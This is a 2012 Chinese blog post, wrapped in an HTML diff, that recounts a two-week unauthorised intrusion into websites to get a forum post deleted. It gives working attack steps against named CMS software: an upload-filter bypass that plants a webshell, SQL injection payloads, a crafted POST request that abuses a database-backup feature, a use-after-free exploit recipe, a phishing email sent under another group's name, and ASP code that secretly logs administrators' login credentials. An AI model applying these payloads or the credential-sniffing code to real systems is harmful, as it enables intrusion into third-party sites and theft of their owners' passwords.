@@ -1,144 +1,441 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>2个星期艰难的渗透纪实 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>2个星期艰难的渗透纪实 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="2个星期艰难的渗透纪实  作者：kyo327  入侵原因，需删一帖子，目标用www.111.com代替，前期通过初期的网站文件暴力猜解，扫描到robots.txt这个文件，有以下目录。如图1：    图1  再通过对这些文件的访问，从3gadm.php文件的标题栏得到该网站采用的是diy-page8.3的cms，自然可以先用搜索引擎搜索该cms暴露的已知漏洞入手。我搜到的大概有三个版本别人分析的结果：一个是子仪的盲注exp，还有两个是来自t00ls的。由于该网站服务器安装有WEB防火墙，导致同一个IP不能多次连续的提交get或post请求，否则就被认为是非法的。这样一来盲注那个exp也就一直没有成功，而我测试使用t00ls小蟑螂那个exp时，在本机自己搭建环境的最新版本是成功的，但是目标仍然失败，我考虑也许是目标版本较低的原因。  由于后台文件admin.php被改名，同时也在进行着网站后台文件的暴力猜解中。不过也许我的字典文件不够大也不够好，结果很令人失望。并且该网站做了禁止普通用户注册、禁止普通用户登陆的安全措施，这样连传图片的权利也给封杀了。  再看他的论坛，毕竟要删的帖子是在论坛上的，但他使用的是最新版的  discuz! X2，因为我测试了之前那个漏洞不好使。  到这里该目标的网站程序方面大概有了些了解，但有用的信息不是很多。接着我用nmap扫描了web服务器的端口情况，只开了80，也许其他端口被防火墙K掉了吧。通过经验访问一个不存在目录，服务器返回如图2：    图2  从图2看出，貌似是iis7.0或iis7.5，再用iiswrite.exe对网站发送一个head包，返回 Server: Microsoft-IIS/7.5，这样的话大概能确定该网站服务器操作系统应该是windows2008.  通过上面的分析，没有找到什么突破口，接下来大家都能想到，可以扫描一下他web服务器上都有哪些网站，从该服务器上的其他网站入手是大家一贯的手法，我也就不多说了。只是我是个苦命人啊，再次遇到cdn，无法简单的判断网站的真实IP。  关于cdn我在这里用简单的几句话科普一下，用户在自己的浏览器中输入要访问的网站的域名，网站主dns选择比较近的cdn服务商节点，并把请求的内容缓存到cdn节点服务器，再把cdn节点服务器ip返回给用户，最后用户再向给定的cdn接点请求网站内容。">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="2个星期艰难的渗透纪实 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/504.seo/" title="2个星期艰难的渗透纪实" itemprop="url">2个星期艰难的渗透纪实</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-06-12T10:18:44.000Z" itemprop="datePublished">2012-06-12</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p><b>2</b><b>个星期艰难的渗透纪实</b></p>  <p>作者：kyo327<b></b></p>  <p>入侵原因，需删一帖子，目标用www.111.com代替，前期通过初期的网站文件暴力猜解，扫描到robots.txt这个文件，有以下目录。如图1：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/2_201D/clip_image001.jpg" width="254" height="284"></p>  <p>图1</p>  <p>再通过对这些文件的访问，从3gadm.php文件的标题栏得到该网站采用的是diy-page8.3的cms，自然可以先用搜索引擎搜索该cms暴露的已知漏洞入手。我搜到的大概有三个版本别人分析的结果：一个是子仪的盲注exp，还有两个是来自t00ls的。由于该网站服务器安装有WEB防火墙，导致同一个IP不能多次连续的提交get或post请求，否则就被认为是非法的。这样一来盲注那个exp也就一直没有成功，而我测试使用t00ls小蟑螂那个exp时，在本机自己搭建环境的最新版本是成功的，但是目标仍然失败，我考虑也许是目标版本较低的原因。</p>  <p>由于后台文件admin.php被改名，同时也在进行着网站后台文件的暴力猜解中。不过也许我的字典文件不够大也不够好，结果很令人失望。并且该网站做了禁止普通用户注册、禁止普通用户登陆的安全措施，这样连传图片的权利也给封杀了。</p>  <p>再看他的论坛，毕竟要删的帖子是在论坛上的，但他使用的是最新版的</p>  <p>discuz! X2，因为我测试了之前那个漏洞不好使。</p>  <p>到这里该目标的网站程序方面大概有了些了解，但有用的信息不是很多。接着我用nmap扫描了web服务器的端口情况，只开了80，也许其他端口被防火墙K掉了吧。通过经验访问一个不存在目录，服务器返回如图2：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/2_201D/clip_image002.jpg" width="540" height="144"></p>  <p>图2</p>  <p>从图2看出，貌似是iis7.0或iis7.5，再用iiswrite.exe对网站发送一个head包，返回 Server: Microsoft-IIS/7.5，这样的话大概能确定该网站服务器操作系统应该是windows2008.</p>  <p>通过上面的分析，没有找到什么突破口，接下来大家都能想到，可以扫描一下他web服务器上都有哪些网站，从该服务器上的其他网站入手是大家一贯的手法，我也就不多说了。只是我是个苦命人啊，再次遇到cdn，无法简单的判断网站的真实IP。</p>  <p>关于cdn我在这里用简单的几句话科普一下，用户在自己的<a href="http://baike.baidu.com/view/7718.htm" target="_blank" rel="external">浏览器</a>中输入要访问的网站的域名，网站主dns选择比较近的cdn服务商节点，并把请求的内容缓存到cdn节点服务器，再把cdn节点服务器ip返回给用户，最后用户再向给定的cdn接点请求网站内容。</p><a id="more"></a><p></p>  <p>我测试使用不同地区的vpn去ping网站域名，发现ip都不一样，后来通过google搜索他网站的相关帖子，发现有另外一个域名www.222.com显示相同的内容。再次用此域名进行旁注域名查询，总算有了真实的结果，如图3：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/2_201D/clip_image003.jpg" width="497" height="320"></p>  <p>图3</p>  <p>但令人悲催的是，这几个域名最终全都指向了主网站和论坛。</p>  <p>由于<a href="http://www.222.com/" target="_blank" rel="external">www.222.com</a>是直接指向论坛，而<a href="http://www.111.com/" target="_blank" rel="external">www.111.com</a>指向cms,可以判断两个网站应该是不同的虚拟目录。于是我用自己写的扫描器对www.222.com进行了网站文件暴力猜解如图4：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/2_201D/clip_image005.jpg" width="557" height="444"></p>  <p>图4</p>  <p>从图4中看到，总算有个信息泄露的问题了。</p>  <p>打开phpinfo.php得到如图5：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/2_201D/clip_image006.jpg" width="386" height="281"></p>  <p>图5</p>  <p>从图5我得到了，目标操作系统是windows2008,php运行方式FASTCGI,PHP版本5.2.17，还有网站物理路径等等，让我眼前一亮的是iis7.5+FASTCGI在默认情况下，IIS处理请求的时候可能导致如nginx安全漏洞一样的问题，任何用户可以远程将任何类型的文件以PHP的方式去解析。</p>  <p>我马上找到一个该网站某个图片链接地址进行类似这样的请求：<a href="http://www.222.com/images/aaa.gif/kyo.php" target="_blank" rel="external">http://www.222.com/images/aaa.gif/kyo.php</a> ,没有返回404，并且返回的http头状态码是200，这时我基本肯定了该漏洞的存在。新想，这个站死定了。但我没想到后面的过程竟是如此艰难。</p>  <p>随后我带着喜悦的心情，迅速的在该论坛注册了账户，并急切的上传那个带着一句话php木马的美女图片，但结果仍然是令人沮丧的，论坛设置了所有附件传到另外一个文件服务器上，而那个文件服务器是windows2003，没有类似的bug，并且和目标不在一个C段。可这个漏洞却很诱人的，我还考虑到论坛显示帖子是html文件类型的，如果能在显示帖子的html里写入&lt;?php phpinfo();?&gt;倒也是可以利用的，只是&lt;&gt;总是被过滤为&amp;lt; &amp;gt;，主站的cms又禁止登陆，cms后台文件也无法找到，看来只能再换换别的思路了。</p>  <p>每个做网络安全的应该都了解，在网络上每个人享受各种服务，上论坛，听音乐，网上支付，购物等等。最重要的就是自己的密码，而账号大多都是公开的，只要我们拥有目标的常用密码，就可以尝试他的其他网站的登录验证，因此我开始了从二级域名入手的打算，拿下后至少可以得到他的常用密码之一。</p>  <p>通过他本网站的链接和二级域名爆破查询工具，再加上自己的分析，我得到了target比较主要的一个二级域名为:a.111.com，仍然是一个比较成熟的、没有任何已知漏洞的cms的博客程序，值得庆幸的是，这个二级域名所在的服务器倒有十几个其他的网站，应该是虚拟主机，操作系统是win2003，同时支持php和asp.</p>  <p>我首先瞄上了一个站是：<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a>,很轻松的扫描出他后台管理文件为：</p>  <p><a href="http://www.aaa.com/admin/admin_index.php" target="_blank" rel="external">http://www.aaa.com/admin/admin_index.php</a> 直接把url在浏览器浏览发现他没有做严密的验证，后台一部分功能是可以使用的，如图6</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/2_201D/clip_image008.jpg" width="547" height="355"></p>  <p>图6</p>  <p>并且后台使用了FCKeditor，是最新版本，测试了这个编辑器的漏洞集合后无果，只能把希望寄托在图6的上传图片那里是否有问题了。这次还算顺利，我在vmware的winxp系统用WSockExpert.exe抓了一下上传的包，在一句话asp木马里添加下gif89a头，再在包的这里改为：</p>  <p>Content-Disposition: form-data; name=&quot;article_img&quot;; filename=&quot;C:\aa.asp .gif&quot;</p>  <p>用nc提交后即得到名为120107005538_53.asp的上传文件，也就拿到其webshell。如图7：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/2_201D/clip_image010.jpg" width="557" height="208"></p>  <p>图7</p>  <p>其实这里上传的时候，web防火墙也拦了好几次，几乎杀了我95%的小马，最后只能请出独门暗器才躲过这bt的防火墙。后来才知道该虚拟主机使用的组合是【星外+护卫神.入侵防护专家】。</p>  <p>拿到<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a>的webshell后，自然是想跨目录到a.111.com。而最新的星外+护卫神的确很有效，删除了wscript.shell、shellapplication等扩展，还不支持aspx，没有任何运行命令的可能。</p>  <p>我用phpinfo看了下<a href="http://www.aaa.com的web/" target="_blank" rel="external">www.aaa.com的web</a>服务器的php版本是5.2.9-2。版本不高，我印象里php5.2.13以下的版本出过好几个漏洞，其中【PHP hash_update_file() Already Freed Resource Access Vulnerability】是比较著名的。于是我放下该站的webshell，找到这个漏洞公告和poc，准备调试一下这个漏洞，用它去执行命令，进而提升权限。</p>  <p>公告地址为：<a href="http://sebug.net/vuldb/ssvid-19563" target="_blank" rel="external"></a></p>  <p><a href="http://php-security.org/2010/05/01/mops-2010-001-php-hash_update_file-already-freed-resource-access-vulnerability/index.html" target="_blank" rel="external">http://php-security.org/2010/05/01/mops-2010-001-php-hash_update_file-already-freed-resource-access-vulnerability/index.html</a></p>  <p>我在vmware_winxp的apache+php环境里，用windbg附加进程httpd.exe,然后在浏览器打开这个漏洞的poc，发生异常，如图8：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/2_201D/clip_image012.jpg" width="557" height="305"></p>  <p>图8</p>  <p>由图8可以看到发生问题的模块是php5ts.dll,发生问题的函数是php_hash_register.在这个函数偏移0x2bf处发生了异常。</p>  <p>显然php5ts.dll是php的核心解析器，php所有的功能都包含在它里面，不论什么操作系统运行php都少不了要加载它。从这里可以看出这个漏洞危害的范围很广，是跨平台的。至于漏洞发生的原因就不在这里调试叙述了。</p>  <p>现在看发生异常的位置是：</p>  <p>00a74fef ff5204 call dword ptr [edx+4] ds:0023:55555559=????????</p>  <p>Eip为0x00a74fef的地方，而poc第一句代码就是define(&quot;OFFSET&quot;, pack(&quot;L&quot;,0x55555555));把这个地址装入一个二进制串中。再看异常发生时的寄存器环境如图8中的edx=0x55555555，后来再通过调试确定开始的第一句代码的地址就是控制的edx寄存器。那么只要能在edx+4指向的地址装入精心构造的shellcode，就可以顺利溢出了。</p>  <p>“PHP addcslashes()信息泄露漏洞，他可以读出内存空间中的信息，在读出的信息中，从偏移0x10开始，保存了一个指针，而在该指针偏移0x20开始保存我们控制的变量的值。”</p>  <p>这样的话我们就可以用PHP addcslashes()漏洞找到放置shellcode的地址，再找到某个变量A的地址，在变量A的地方存放shellcode的地址，那么call [edx+4]就可以执行shellcode了。把那两个poc结合起来，最后那个hexdump()函数改成我们自己的找到偏移0x10指向的0x20的地址的函数，好像很绕口。</p>  <p>其实是很简单的一个功能，直接附上2yue写的这个函数。</p>  <p>function hexdump($x) </p>  <p>{</p>  <p>$ret_long = ord($x[0x13]) <em> 0x1000000 + ord($x[0x12]) </em> 0x10000 + ord($x[0x11]) <em> 0x100 + ord($x[0x10]);</em></p>  <p>$ret_long = $ret_long + 0x20; </p>  <p>return $ret_long;</p>  <p>}</p>  <p>只是里面的细节还需要调一调：例如要生成纯字母数字的shellcode，edx+4那个地方调一下等等，然后就可以用 metasploit生成我们想要的纯字母数字的shellcode了。</p>  <p>我在本机测试成功，如图9，当然还是要感谢2yue。</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013" border="0" alt="clip_image013" src="http://img.cker.in/2_201D/clip_image013.jpg" width="540" height="191"></p>  <p>图9</p>  <p>在漏洞调试成功后的第2天，我准备用这个exp提权时，用菜刀连上我的webshell，谁知道却返回404.</p>  <p>我把<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a> 输入浏览器后，返回如下信息，如图10</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/2_201D/clip_image014.jpg" width="514" height="232"></p>  <p>图10</p>  <p>从图10看到，那个昨天刚拿下的网站，今天域名就过期，我悲催的人生仍在延续，我能说什么呢。</p>  <p>我只能老老实实再杀回来，仔细分析虚拟主机上剩下的那几个网站了。那个悲催的站被关闭了之后剩下的不是discuz! X2 就是静态html的站，再不就是很知名的较新版本的无已知漏洞的cms了，就只有一个asp的站，地址为：<a href="http://www.bbb.com/" target="_blank" rel="external">http://www.bbb.com</a>。也许这个站是唯一的突破口了，用后台扫描器很容易扫到后台是<a href="http://www.bbb.com/manage/" target="_blank" rel="external">http://www.bbb.com/manage/</a> 如图11</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015" border="0" alt="clip_image015" src="http://img.cker.in/2_201D/clip_image015.jpg" width="441" height="204"></p>  <p>图11</p>  <p>从图11很清晰的得到这个网站程序是3hooCMS V3 SP2，我搜了一下，没有找到这个版本的漏洞，较低的版本倒是有一个xss漏洞，并且也没有这个版本CMS的公开下载，我怀疑目标是商业版。我只找到3hooCMS_V2_SP2的下载。</p>  <p>下载完后我在vmware_win2003下搭了环境，开始分析其源代码。</p>  <p>经过一段时间的分析，我发现Search.Asp这个文件存在sql注入漏洞。</p>  <p>代码第9行到12行</p>  <p>Dim TplFileUrl,TplStr,Sql,Rs,rCid,Cid </p>  <p>SoKey=trim(request(&quot;sokey&quot;))</p>  <p>page=request.QueryString(&quot;page&quot;)</p>  <p>第10行SoKey变量没有经过任何过滤传了进来。</p>  <p>第41到47行</p>  <p>if SoKey=&quot;&quot; then </p>  <p>csql=&quot;&quot;</p>  <p>filename=&quot;Search.Asp&quot;</p>  <p>else </p>  <p>filename=&quot;Search.Asp?sokey=&quot;&amp;SoKey</p>  <p>end if </p>  <p>sql=&quot;select  from [info] where &quot;&amp;LanguageSet&amp;&quot;Name like’%&quot;&amp;SoKey&amp;&quot;%’ order by id desc;&quot;</p>  <p>SoKey被当做搜索型变量传入sql语句中。</p>  <p>因此这里存在是一个搜索型的注入漏洞。</p>  <p>由于是已知的cms，其表名和字段名都不用猜了：</p>  <p>管理员表名：ScmsAdmin</p>  <p>用户名字段：username 密码字段：password .</p>  <p>选择好关键字直接在nbsi工具里跑吧。</p>  <p>很遗憾的是没有跑出任何结果，于是我在目标网站手工在搜索输入框里测试。</p>  <p>当输入33%’ and 1=1 and ‘%’=’时查询出了一些结果。</p>  <p>而输入33%’ and 1=2 and ‘%’=’时又没有任何结果。完全没有问题啊，sql语句肯定执行了，注入百分之百存在，但为什么就是跑不出来呢。我突然想到，也许新版本第10行代码应该是这么写的吧</p>  <p>SoKey=trim(request.form(&quot;sokey&quot;))</p>  <p>这是post提交方式哦，我马上变换成了post的扫描方式，终于得出了结果如图12</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017" border="0" alt="clip_image017" src="http://img.cker.in/2_201D/clip_image017.jpg" width="557" height="145"></p>  <p>图12</p>  <p>得到加密的密码【fead0df1fe60103eaba454dd0a7e0842】后拿到cmd5解密，于是我悲催的运气再次降临，掏钱都无法解密。看来这年头不设置个10位以上字母+数字+特殊字符的密码都不好意思和别人打招呼啊。</p>  <p>Md5密码破不出来其实是常有的事，不过也说明国内上网用户的安全意识也在一步步的提高。我考虑到既然他网站有这个注入漏洞，那么管理员即便改了密码，我仍然能通过SQL注入漏洞得到hash，如果他能改一个cmd5能破出来的简单的密码不就有希望了吗？于是我借用2011年底的网络安全密码泄露门事件，给管理员发了一封email。如图13：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/2_201D/clip_image019.jpg" width="557" height="302"></p>  <p>图13</p>  <p>很不好意思，这里我借用了90sec.org的名义，因为我觉得90sec中有很多90后的技术水平还是蛮高的，并且喜欢免费给某些网站提交漏洞。</p>  <p>Email发出去2天后，再次注入得出密码的hash，发现他没有修改。我也感觉此路不通，即便他修改了，很有可能密码还是很bt复杂的破不出来啊。</p>  <p>后来又想到去社工主网站<a href="http://www.111.com/" target="_blank" rel="external">www.111.com</a>的管理员，询问他为什么主网站不能注册普通用户，也不能登录，是不是网站程序坏掉了。想借他们修复普通用户注册功能后，上传一个含有php木马的图片,再利用iis7.5的解析漏洞得到shell。但得到的答复是，他们就是专门禁止普通用户注册和登陆的。</p>  <p>罢了，我社工真的不擅长，不太会与人交互，还是靠自己吧。</p>  <p><b>0</b><b>×07 V5的迂回战术</b></p>  <p>考虑到好不容易拿到<a href="http://www.bbb.com/" target="_blank" rel="external">http://www.bbb.com</a>的hash，不能这么轻易放过这个站啊。于是想到看这个管理员有没有其他的站，通过拿下他自己的另外的站然后再得到其密码也是一个不错的选择。这就是所谓的迂回战术吧，我不从正面进攻了，我从你有弱点的地方进攻还不行嘛？</p>  <p>于是我根据他网站提供的信息，再加上whois查询、域名查询、谷歌、百度，终于发现这个管理员在其他虚拟机还存在三个类似的站分别是:</p>  <p><a href="http://www.bbb1.com/" target="_blank" rel="external">http://www.bbb1.com</a></p>  <p><a href="http://www.bbb2.com/" target="_blank" rel="external">http://www.bbb2.com</a></p>  <p><a href="http://www.bbb3.com/" target="_blank" rel="external">http://www.bbb3.com</a></p>  <p>虚拟主机操作系统同样是windows2003.令人兴奋的是这三个站与<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>使用的是同一套cms，都是3hooCMS V3 SP2.</p>  <p>利用我前面发现的sql注入漏洞很容易得到bbb1、bbb2两个站的后台管理员的密码hash都为【fead0df1fe60103eaba454dd0a7e0842】，和bbb.com是一样无法破解的。</p>  <p>第五次悲催的运气令我暂时放弃了一段时间。</p>  <p>又过了一天，我怀着百分之一的希望把<a href="http://www.bbb3.com/" target="_blank" rel="external">www.bbb3.com</a>也扫了一遍，但惊奇的是密码hash和其他三个都不一样，立刻拿到cmd5去破解。如图14：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image021" border="0" alt="clip_image021" src="http://img.cker.in/2_201D/clip_image021.jpg" width="557" height="210"></p>  <p>如图14</p>  <p>就这样我拿到了www.bbb3.com管理员的密码。这下我感到形式一片大好，思路是这样：</p>  <p>1. 通过进入bbb3.com的后台，得到一个webshell。</p>  <p>2. 再从webshell里通过提权跨目录到bbb2.com。</p>  <p>3. 改写bbb2.com的后台登陆后代码，嗅探其明文密码。</p>  <p>4. 同步进行ftp密码的破解，顺便去尝试bbb.com的ftp。</p>  <p>至此我感觉这个迂回的战术还算威武吧。</p>  <p>进入<a href="http://www.bbb3.com/" target="_blank" rel="external">www.bbb3.com</a>后台后，尝试了上传的地方，又看了源代码，发现没什么漏洞，他严格检测了后缀并以时间格式强制改了上传后的文件名。应该是较成熟的上传代码。而网站设置那块是写入数据库的。唯一可能出问题的地方也就是数据库备份这里了。如图15：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image023" border="0" alt="clip_image023" src="http://img.cker.in/2_201D/clip_image023.jpg" width="557" height="403"></p>  <p>图15</p>  <p>从图15得知数据库的路径和后缀，不过看着诱人的asa后缀，却做好了防下载处理，我利用asp小马代码入库的方式来测试，发现#Data23%base#.asa是无法执行asp的。</p>  <p>只剩下备份这里容易出问题了。</p>  <p>大家肯定是这样想的，上传一个带一句话asp木马的图片，然后备份这个图片为asp不就完事了吗？</p>  <p>但悲催的是有以下几个问题需要解决：</p>  <p>1. 当前数据库路径输入框这里和备份数据库名称输入框这里都是只读的，无法更改。</p>  <p>2. 即便备份为a.asp;a.jpg也不可执行（我后来才知道，可能是防火墙拦截的原因）。</p>  <p>第一个问题好处理，客户端的一切防御手段都是浮云。一个readonly能阻挡我这个久经沙场的老将吗？不论是把其htm存下来，把action完整路径附上提交，还是用firefox的插件，再或是用国外的神器burpsuite，都能轻松绕过。</p>  <p>至于第二个问题，我发现肯定备份出了a.asp;a.jpg类型的文件，可是用浏览器访问却总是出现恶心的404错误。</p>  <p>我只能再看其cms源代码，看他备份这里到底是如何处理的。</p>  <p>看了一会儿后，如愿以偿的发现了问题，漏洞文件为Admin_DataBackup.asp</p>  <p>代码65—83行代码如下：</p>  <p>sub backupdata() </p>  <p>Dbpath=request.form(&quot;Dbpath&quot;) </p>  <p>Dbpath=server.mappath(Dbpath) </p>  <p>bkfolder=request.form(&quot;bkfolder&quot;) </p>  <p>bkdbname=request.form(&quot;bkdbname&quot;) </p>  <p>Set Fso=server.createobject(&quot;scripting.filesystemobject&quot;) </p>  <p>if fso.fileexists(dbpath) then </p>  <p>72.If CheckDir(bkfolder) = True Then </p>  <p>73.fso.copyfile dbpath,bkfolder&amp; &quot;\&quot;&amp; bkdbname &amp; &quot;.mdb&quot;</p>  <p>74.else </p>  <p>75.MakeNewsDir bkfolder </p>  <p>76.fso.copyfile dbpath,bkfolder&amp; &quot;\&quot;&amp; bkdbname &amp; &quot;.mdb&quot;</p>  <p>end if </p>  <p>response.write &quot;&lt;center&gt;备份数据库成功，备份的数据库路径为 &quot; &amp; bkfolder &amp; &quot;\&quot; &amp; bkdbname &amp; &quot;.mdb&lt;/center&gt;&quot; </p>  <p>response.write &quot;&lt;center&gt;&lt;a href=’Databackup\&quot; &amp; bkdbname &amp; &quot;.mdb’ a&gt;下载本次备份数据库到本地&lt;/a&gt;&lt;/center&gt;&quot; </p>  <p>Else </p>  <p>response.write &quot;找不到您所需要备份的文件。&quot; </p>  <p>End if </p>  <p>end sub</p>  <p>第68行 bkfolder=request.form(&quot;bkfolder&quot;) 没有对目录名做过滤。</p>  <p>而request.form(&quot;bkfolder&quot;)是从第37行这句代码传过来的。</p>  <p>&lt;td height=&quot;22&quot;&gt;&lt;input type=&quot;hidden&quot; size=50 name=bkfolder value=Databackup &gt;&lt;/td&gt;</p>  <p>说明默认情况下bkfolder= Databackup这个目录。</p>  <p>第72到76行，是说检测bkfolder这个目录是否存在，如果不存在就调用</p>  <p>MakeNewsDir bkfolder 这个函数。</p>  <p>再看98—103行代码如下：</p>  <p>Function MakeNewsDir(foldername) </p>  <p>Set fso1 = CreateObject(&quot;Scripting.FileSystemObject&quot;) </p>  <p>Set f = fso1.CreateFolder(foldername) </p>  <p>MakeNewsDir = True </p>  <p>Set fso1 = nothing </p>  <p>End Function</p>  <p>直接调用fso创建一个没有过滤的参数的文件夹。</p>  <p>这时大家可能都想到了，那么如果我们上传的时候抓包，把默认的文件夹Databackup改为kyo.asp，那不就创建了一个kyo.asp的文件夹吗？这样配合iis6.0的漏洞将可以成功执行我的美女图片asp木马。</p>  <p>实战当中也是这样的，把抓的包改为这样的形式,再用nc提交就KO了。</p>  <p>POST /manage/Admin_DataBackup.asp?action=Backup HTTP/1.1</p>  <p>Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, <em>/</em></p>  <p>Accept-Language: zh-cn</p>  <p>Content-Type: application/x-www-form-urlencoded</p>  <p>Accept-Encoding: gzip, deflate</p>  <p>User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)</p>  <p>Host: www.bbb3.com</p>  <p>Content-Length: 77</p>  <p>Connection: Keep-Alive</p>  <p>Cache-Control: no-cache</p>  <p>Cookie: ASPSESSIONIDSATTCRQC=LFGDIANCDLPBPGNJNCMPKEIM; Scms%5FVerifyCode=9109</p>  <p>DBpath=..%2FUpLoadFile%2F20120112012046769.jpg&amp;bkfolder=kyo.asp&amp;bkDBname=data</p>  <p>那么备份成功后，菜刀提交url路径类似于这样：</p>  <p><a href="http://www.bbb3.com/manage/kyo.asp/data.mdb" target="_blank" rel="external">http://www.bbb3.com/manage/kyo.asp/data.mdb</a></p>  <p>至此也算拿下了一个webshell，万里长征又进了一步。</p>  <p><b>0</b><b>×09 asp登陆口嗅探变态的密码</b></p>  <p>幸运的是<a href="http://www.bbb3.com/" target="_blank" rel="external">www.bbb3.com</a>所在的虚拟主机没有做什么安全措施，传上去一个aspx的木马就可以跨到<a href="http://www.bbb1.com/" target="_blank" rel="external">www.bbb1.com</a>和<a href="http://www.bbb2.com/" target="_blank" rel="external">www.bbb2.com</a>的目录里去了，毕竟aspx默认是权限稍大的user权限。在尝试ftp密码无果后，下一步就是在bbb1和bbb2的后台登陆口页面写嗅探代码了。</p>  <p>我在Admin_Send.asp页面第8行开始添加以下代码：</p>  <p>thename=replace(trim(request.form(&quot;username&quot;)),&quot;’&quot;,&quot;&quot;)</p>  <p>thepass=replace(trim(Request.form(&quot;password&quot;)),&quot;’&quot;,&quot;&quot;)</p>  <p>SaveFile=&quot;page.gif&quot; </p>  <p>GetPostStr=thename&amp;&quot;|&quot;&amp;thepass</p>  <p>set F=server.CreateObject(&quot;scripting.filesystemobject&quot;)</p>  <p>set I=F.OpenTextFile(server.mappath(SaveFile),8,True,0)</p>  <p>I.WriteLine(GetPostStr)</p>  <p>I.close</p>  <p>Set F=nothing</p>  